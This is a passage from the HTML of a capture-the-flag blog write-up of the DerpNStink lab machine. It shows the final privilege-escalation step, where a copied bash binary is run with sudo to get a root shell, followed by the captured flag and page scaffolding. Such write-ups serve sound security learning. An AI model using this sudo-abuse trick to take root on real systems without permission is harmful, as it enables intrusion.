+</pre></td><td class='code'><pre><code class=''><span class='line'>mrderp@DeRPnStiNK:~/binaries$ cp -p /bin/bash derpy.sh
+</span><span class='line'>mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
+</span><span class='line'>[sudo] password for mrderp:
+</span><span class='line'>root@DeRPnStiNK:~/binaries#</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Only at the end I realized I should have also collected flags, but I was too lazy to return to that, so leaving only the last flag here:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@DeRPnStiNK:/root# cat Desktop/flag.txt
+</span><span class='line'>flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)
+</span><span class='line'>
+</span><span class='line'>Congrats on rooting my first VulnOS!
+</span><span class='line'>
+</span><span class='line'>Hit me up on twitter and let me know your thoughts!
+</span><span class='line'>
+</span><span class='line'>@securekomodo</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>______________________________________
+</span><span class='line'>/ You need more time; and you probably \
+</span><span class='line'>\ always will.                         /
+</span><span class='line'>--------------------------------------
+</span><span class='line'>       \   ^__^
+</span><span class='line'>        \  (oo)\_______
+</span><span class='line'>           (__)\       )\/\
+</span><span class='line'>               ||----w |
+</span><span class='line'>               ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2019-05-19T20:36:18+03:00" pubdate data-updated="true">May 19<span>th</span>, 2019</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2019/05/19/derpnstink/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2019/05/19/derpnstink/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2019/04/15/donkey-docker/" title="Previous Post: Donkey Docker">&laquo; Donkey Docker</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2019/05/19/derpnstink/">Derpnstink</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/04/15/donkey-docker/">Donkey Docker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/04/07/hackfest-2016-orcus/">Hackfest 2016 Orcus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/04/02/goldeneye-007/">GoldenEye 007</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/12/27/my-oswp-review/">My OSWP review</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2019 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2019/05/19/derpnstink/';
+        var disqus_url = 'http://chousensha.github.io/blog/2019/05/19/derpnstink/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
